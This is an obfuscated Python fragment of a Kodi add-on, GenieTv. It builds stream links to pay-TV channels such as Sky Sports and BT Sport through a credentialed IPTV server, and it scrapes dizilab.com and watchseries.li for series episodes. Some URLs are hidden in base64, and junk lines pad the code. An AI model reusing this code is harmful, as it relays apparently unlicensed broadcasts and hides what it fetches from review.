 IiIII . write ( r'Disc.Turbo=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F168.m3u8&mode=10012&name=[COLORgreen]Discovery+Turbo%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Food Network=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F639.m3u8&mode=10012&name=[COLORgreen]Food+Network%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'MTV MUSIC=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F234.m3u8&mode=10012&name=[COLORgreen]MTV+Music%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Film4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F182.m3u8&mode=10012&name=[COLORgreen]Film4%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'True Movies=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F853.m3u8&mode=10012&name=[COLORgreen]True+Movies%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'True Movies 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F852.m3u8&mode=10012&name=[COLORgreen]True+Movies+2%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Action=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F732.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Action+%26+Adventure%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky ScFiHorror=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F511.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Sci-Fi+%26+Horror%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'SkyPremiereHD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F516.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Premiere%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Greats=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F512.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Greats%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Family=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F509.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Family%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky DramaRom=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F510.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Drama+%26+Romance%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Thriller=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F514.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Crime+%26+Thriller%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Comedy=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F513.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Comedy%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Showcase=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F46.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Showcase%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Select=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F45.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Select%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Disney=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F195.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Disney%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Sports 1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F18.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+1%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Sports 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F19.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+2%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Sports 3=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F20.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+3%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Sports 4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F21.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+4%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Sports 5=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F22.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+5%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Sports F1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F24.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+F1%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Sky Sports News=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F23.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+News%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'BT Sport 1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F309.m3u8&mode=10012&name=[COLORgreen]BT+Sport+1%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'BT Sport 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F26.m3u8&mode=10012&name=[COLORgreen]BT+Sport+2%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'BT Sport Europe=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F705.m3u8&mode=10012&name=[COLORgreen]BT+Sport+Europe%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'BT Sport ESPN=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F28.m3u8&mode=10012&name=[COLORgreen]BT+Sport+ESPN%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Box Nation=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F173.m3u8&mode=10012&name=[COLORgreen]Box+Nation%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'WWENetwork=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F178.m3u8&mode=10012&name=[COLORgreen]WWENetwork%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Eurosport=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F269.m3u8&mode=10012&name=[COLORgreen]Eurosport+1%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Eurosport 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F748.m3u8&mode=10012&name=[COLORgreen]Eurosport+2%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'At The Races=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F170.m3u8&mode=10012&name=[COLORgreen]At+the+Races%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Racing UK=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F171.m3u8&mode=10012&name=[COLORgreen]Racing+UK%0D[%2FCOLOR]' + '\n' )
 IiIII . write ( r'Poker central US=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F826.m3u8&mode=10012&name=[COLORgreen]Poker+central+US%0D[%2FCOLOR]' + '\n' )
 if 90 - 90: OoO0O0 . o0Oo0O0Oo00oO / iIii1I11I1II1
 if 28 - 28: OoO0O0 + OoIii111II - o0Oo0O0Oo00oO / iIii1I11I1II1 - OOOo0
 if 45 - 45: O0 / i1IIi * OoIii111II * Ooo00oOo00o
def II11IiiiI11iIIi1 ( ) :
 if 72 - 72: oo0OO * iii11
 ooOooo000oOO ( '[COLORgreen]Recent Episodes[/COLOR]' , '' , 10019 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Genres[/COLOR]' , '' , 10020 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Search[/COLOR]' , '' , 10021 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 if 67 - 67: i1IIi
def iii ( ) :
 if 57 - 57: OOOo0
 iIIiiI1II1i11 = cloudflare . source ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29t' ) )
 o0o = re . compile ( '<li id=".+?">.+?<a href="(.+?)">.+?<img width="40" height="40" src="(.+?)" alt=""/>.+?<span class="title">\n(.+?)</span>.+?<span class="alt-title">\n(.+?)</span>.+?</a>.+?</li>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , o0O0o0 , OO , iIiIIi1 in o0o :
  ooOooo000oOO ( OO + '  -  ' + ( iIiIIi1 ) . replace ( 'sezon' , 'Season' ) . replace ( 'bölüm' , 'Episode' ) , iI1i11 , 10023 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
  if 35 - 35: OoooooooOO - O0o0Ooo / Ooo00oOo00o
  if 50 - 50: I1IiI
  if 33 - 33: Ooo0OO0oOO
def oOo00OoO0O ( ) :
 if 69 - 69: iIii1I11I1II1 * OOOo0 - oo0OO + O0 + O0
 ooOooo000oOO ( '[COLORgreen]Action[/COLOR]' , 'Aksiyon' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Adventure[/COLOR]' , 'Macera' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Animation[/COLOR]' , 'Animasyon' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Anime[/COLOR]' , 'Anime' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Biography[/COLOR]' , 'Biyografi' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Comedy[/COLOR]' , 'Komedi' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Crime[/COLOR]' , 'Su%C3%A7' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Documentary[/COLOR]' , 'Belgesel' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Drama[/COLOR]' , 'Dram' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Family[/COLOR]' , 'Aile' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Fantasy[/COLOR]' , 'Fantastik' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]History[/COLOR]' , 'Tarih' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Horror[/COLOR]' , 'Korku' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Mini-Series[/COLOR]' , 'Mini%20Dizi' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Musical[/COLOR]' , 'M%C3%BCzikal' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Mystery[/COLOR]' , 'Gizem' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Romance[/COLOR]' , 'Romantik' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Science Fiction[/COLOR]' , 'Bilim%20Kurgu' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Sport[/COLOR]' , 'Spor' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Thriller[/COLOR]' , 'Gerilim' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]War[/COLOR]' , 'Sava%C5%9F' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Western[/COLOR]' , 'Tarih' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Youth[/COLOR]' , 'Gen%C3%A7lik' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 if 65 - 65: O0o0Ooo / i11iIiiIii / Ooo00oOo00o - iii11
def IiI1o0O ( url ) :
 OooooOOoo0 = 'http://dizilab.com/arsiv?limit=100&tur=' + url + '&orderby=&ulke=&order=&yil=&dizi_adi='
 OoOO = cloudflare . source ( OooooOOoo0 )
 o0o = re . compile ( '<div class="tv-series-single">.+?<a href="(.+?)" class="film-image">.+?<img src="(.+?)" alt=""/>.+?<span class="position">.+?</span>\n(.+?)</a>' , re . DOTALL ) . findall ( OoOO )
 for url , o0O0o0 , OO in o0o :
  ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , url , 10022 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
  if 38 - 38: o0Oo0O0Oo00oO + OoO0O0
  if 9 - 9: o0Oo0O0Oo00oO + OoOoOO00 % o0Oo0O0Oo00oO % OoO0O0 + iIii1I11I1II1
  if 59 - 59: i1IIi
  if 48 - 48: O0 * ii11i1 * Ooo00oOo00o . Ooo00oOo00o * Ooo0OO0oOO - ii11i1
def iIi11i ( ) :
 if 56 - 56: i11iIiiIii . o0Oo0O0Oo00oO / oo0OO
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O0ooOOO = IIi1I1iiiii . lower ( )
 iI1i11 = ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29tL2Fyc2l2P2xpbWl0PSZ0dXI9Jm9yZGVyYnk9JnVsa2U9Jm9yZGVyPSZ5aWw9JmRpemlfYWRpPQ==' ) ) + ( IIi1I1iiiii ) . replace ( ' ' , '+' )
 OoOO = cloudflare . source ( iI1i11 )
 o0o = re . compile ( '<a href="(.+?)" class="film-image">\n<img src="(.+?)" alt=""/>\n</a>\n<div class="tss-detail">\n<a class="title" style="" href=".+?">\n<span class="position">.+?</span>\n(.+?)</a>' ) . findall ( OoOO )
 for iI1i11 , o0O0o0 , OO in o0o :
  if IIi1I1iiiii in OO . lower ( ) :
   ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , iI1i11 , 10022 , ii11iIi1I + 'dtv.png' )
   if 48 - 48: Ooo00oOo00o * iii11 + iIii1I11I1II1 / OoOoOO00
   if 100 - 100: Ooo0OO0oOO
   if 59 - 59: OoIii111II * iii11 + OOooOOo . ii11ii1ii
def ooooO ( url ) :
 OoOO = cloudflare . source ( url )
 o0o = re . compile ( '<a class="season" href="(.+?)">\n(.+?)\n</a>.+?<a class="episode" href=".+?">\n(.+?)\n</a>.+?<a class="episode-name" href=".+?">\n(.+?)</a>' , re . DOTALL ) . findall ( OoOO )
 for Ooo0OOoOoO0 , oO0O0 , iI111i11iI1 , OO in o0o :
  III1ii = ( iI111i11iI1 ) . replace ( 'Sezon' , '' ) . replace ( 'bölüm' , '' ) . replace ( 'Bölüm' , '' ) . replace ( 'BÃ¶lÃ¼m' , '' ) . replace ( '.' , '' )
  iI1III1iIi11 = ( oO0O0 ) . replace ( 'bölüm' , '' ) . replace ( 'Sezon' , '' ) . replace ( 'Bölüm' , '' ) . replace ( 'BÃ¶lÃ¼m' , '' ) . replace ( '.' , '' )
  i11I1I = 'Season ' + iI1III1iIi11 + 'Episode ' + III1ii + OO
  oo0ooooo00o ( i11I1I , Ooo0OOoOoO0 )
  if 78 - 78: iIii1I11I1II1 . OOooOOo % iIii1I11I1II1 . O0 / iii11
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 76 - 76: i1IIi * OoooooooOO * O0 + O0o0Ooo * O0o0Ooo
  if 35 - 35: OOooOOo
def oo0ooooo00o ( name , url ) :
 Ooo0OOoOoO0 = url
 ooOoooo0 = name
 iiIi11iI1iii = cloudflare . source ( Ooo0OOoOoO0 )
 oo000 = re . compile ( 'file: "(.+?)",.+?label: "(.+?)",' , re . DOTALL ) . findall ( iiIi11iI1iii )
 for o0000oO , OoOoO0oOOooo in oo000 :
  oOO0OO0OO ( '[COLORgreen]' + ooOoooo0 + OoOoO0oOOooo + '[/COLOR]' , o0000oO , 10012 , ii11iIi1I + 'dtv.png' )
  if 99 - 99: iIii1I11I1II1
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 14 - 14: ii11ii1ii % OOOo0 . OoOoOO00 . OOOo0 - o0Oo0O0Oo00oO
 if 45 - 45: OoO0O0 / O0 / I1IiI * iii11
def IiIIiiI ( ) :
 if 60 - 60: O0o0Ooo
 if 98 - 98: o0Oo0O0Oo00oO
 if 34 - 34: iIii1I11I1II1 * Ooo0OO0oOO * Ooo0OO0oOO / ii11ii1ii
 if 28 - 28: Ooo00oOo00o - OoIii111II + I1IiI + ii11i1 / iIii1I11I1II1
 if 26 - 26: iIii1I11I1II1 - O0 . O0
 if 68 - 68: iii11 + OoIii111II . O0 . ii11i1 % i1IIi % iii11
 if 50 - 50: OoO0O0 + OOooOOo
 if 96 - 96: Ooo00oOo00o
 if 92 - 92: Oo / i11iIiiIii + ii11ii1ii
 if 87 - 87: I1IiI % iIii1I11I1II1
 if 72 - 72: iii11 . iii11 - ii11ii1ii
 if 48 - 48: Oo - o0Oo0O0Oo00oO + Oo - OOOo0 * i11iIiiIii . oo0OO
 if 35 - 35: OoO0O0 . O0 + Oo + iii11 + i1IIi
 if 65 - 65: O0 * OOOo0 / OOOo0 . I1IiI
 if 87 - 87: OoOoOO00 * ii11ii1ii % Oo * Oo
 ooOooo000oOO ( '[COLORgreen]Newest Episodes Added[/COLOR]' , 'http://www.watchseries.li/latest' , 10046 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 ooOooo000oOO ( '[COLORgreen]This Week\'s Popular Episodes[/COLOR]' , 'http://www.watchseries.li/new' , 10042 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 ooOooo000oOO ( '[COLORgreen]Search Program[/COLOR]' , '' , 10043 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 if 58 - 58: iii11 . OOooOOo + OOOo0 % Oo - Ooo00oOo00o
 if 50 - 50: oo0OO % OoOoOO00 - o0Oo0O0Oo00oO . i1IIi + O0 % oo0OO
def i1iIi1IIiIII1 ( url ) :
 OoOO = ooOOO0 ( url )
 ii = re . compile ( '<ul class="pagination" style="line-height: 3;">(.+?)</ul>' , re . DOTALL ) . findall ( OoOO )
 o0o = re . compile ( '<li><a href="/letters/(.+?)">(.+?)</a></li>' ) . findall ( str ( ii ) )
 for url , OO in o0o :
  ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://watchseries.li/letters/' + url , 10049 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
  if 19 - 19: Ooo0OO0oOO
def O00O ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<a href="(.+?)" class="sr-header">(.+?)</a>' ) . findall ( OoOO )
 for url , OO in o0o :
  ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://watchseries.li/' + url , 10049 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
  if 94 - 94: ii11i1 - ii11ii1ii + OOooOOo - Oo
def iiIi1iiI1I ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<li class="col-md-6 col-xs-12 list-movies-li"><a href="(.+?)" title=".+?">(.+?)<span class="epnum">.+?</span></a></li>' , re . DOTALL ) . findall ( OoOO )
 oo000 = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( OoOO )
 for url , OO in o0o :
  ooOooo000oOO ( '[COLORgreen]' + ( OO ) . replace ( '&nbsp;' , ' ' ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' ) + '[/COLOR]' , 'http://www.watchseries.li' + url , 10044 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 for url in oo000 :
  ooOooo000oOO ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10049 , ii11iIi1I + 'Next.png' , '' , '' )
  if 26 - 26: iIii1I11I1II1 + i1IIi / I1IiI % ii11ii1ii
  if 44 - 44: OoooooooOO . OoOoOO00 . iii11 % OoooooooOO
def Oo0oO00 ( ) :
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 ii11ii11I = 'http://www.watchseries.li/search/' + IIi1I1iiiii . replace ( ' ' , '%20' )
 OoOO = ooOOO0 ( ii11ii11I )
 o0o = re . compile ( '<img src="(.+?)".+?<a href="(.+?)" title=".+?"><b>(.+?)</b>' , re . DOTALL ) . findall ( OoOO )
 for o0O0o0 , iI1i11 , OO in o0o :
  if 'watch online' in OO :
   pass
  else :
   print iI1i11
   ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://www.watchseries.li' + iI1i11 , 10044 , o0O0o0 , '' , '' )
   if 83 - 83: OoOoOO00 * i1IIi * oo0OO . ii11ii1ii / Ooo0OO0oOO + i1IIi
   xbmcplugin . setContent ( I11i1 , 'movies' )
   if 43 - 43: OoooooooOO
def oOOO0 ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<img src="(.+?)".+?<div class="block-left-home-inside-text">.+?<a href="(.+?)" title=".+?"><b>(.+?)</b> <br>.+?<span class=".+?">(.+?)</span></a><br>(.+?)<br>' , re . DOTALL ) . findall ( OoOO )
 for o0O0o0 , url , OO , iI111i11iI1 , o0OO0o0o00o in o0o :
  i111I11i1I = ( OO ) . replace ( '&nbsp;' , ' ' ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' ) + ' - ' + ( iI111i11iI1 ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' )
  ooOooo000oOO ( '[COLORgreen]' + i111I11i1I + '[/COLOR]' , 'http://www.watchseries.li' + url , 10045 , o0O0o0 , '' , o0OO0o0o00o )
  if 85 - 85: iii11 * i1IIi % OOOo0 - o0Oo0O0Oo00oO
def I11I1ii1i ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<li class="col-md-6 col-xs-12 list-movies-li"><a href="(.+?)" title=".+?">(.+?)<span class="epnum">.+?</span></a></li>' , re . DOTALL ) . findall ( OoOO )
 oo000 = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( OoOO )
 for url , OO in o0o :
  i111I11i1I = ( OO ) . replace ( '&nbsp;' , ' ' ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' )
  ooOooo000oOO ( '[COLORgreen]' + i111I11i1I + '[/COLOR]' , 'http://www.watchseries.li' + url , 10045 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 for url in oo000 :
  ooOooo000oOO ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10046 , ii11iIi1I + 'Next.png' , '' , '' )
  if 22 - 22: OoIii111II * ii11i1 * i11iIiiIii + oo0OO * I1IiI * Ooo00oOo00o
def O000OOO00Ooo ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<div class="mask">.+?<a href="(.+?)" title="(.+?)">.+?<img src="(.+?)"' , re . DOTALL ) . findall ( OoOO )
 oo000 = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( OoOO )
 for url , OO , o0O0o0 in o0o :
  ooOooo000oOO ( '[COLORgreen]' + ( OO ) . replace ( '&nbsp;' , ' ' ) . replace ( '&' , '&' ) . replace ( '&#039;' , '\'' ) + '[/COLOR]' , 'http://www.watchseries.li' + url , 10044 , o0O0o0 , '' , '' )
 for url in oo000 :
  ooOooo000oOO ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10041 , ii11iIi1I + 'Next.png' , '' , '' )
  if 65 - 65: iIii1I11I1II1 % OoIii111II + O0 / OoooooooOO
def O0000oO0o00 ( url ) :
 OoOO = ooOOO0 ( url )
 ii = re . compile ( '<div class="col-md-6 col-xs-12".+?<a href=".+?" itemprop="url"><span itemprop="name">(.+?)</span>(.+?)</ul>' , re . DOTALL ) . findall ( OoOO )
 for oO0O0 , O00OO0o0 in ii :
  o0o = re . compile ( '<li itemprop="episode".+?<meta itemprop="url" content="(.+?)">.+?<span class="" itemprop="name">\n(.+?)\n' , re . DOTALL ) . findall ( str ( O00OO0o0 ) )
  for url , OO in o0o :
   i111I11i1I = ( oO0O0 ) . replace ( '  ' , '' ) + ' ' + ( OO ) . replace ( '&nbsp;' , ' ' ) . replace ( '&#039;' , '\'' ) . replace ( '  ' , '' )
   ooOooo000oOO ( '[COLORgreen]' + i111I11i1I + '[/COLOR]' , 'http://www.watchseries.li' + url , 10045 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 oo000 = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( OoOO )
 for url in oo000 :
  ooOooo000oOO ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10044 , ii11iIi1I + 'Next.png' , '' , '' )
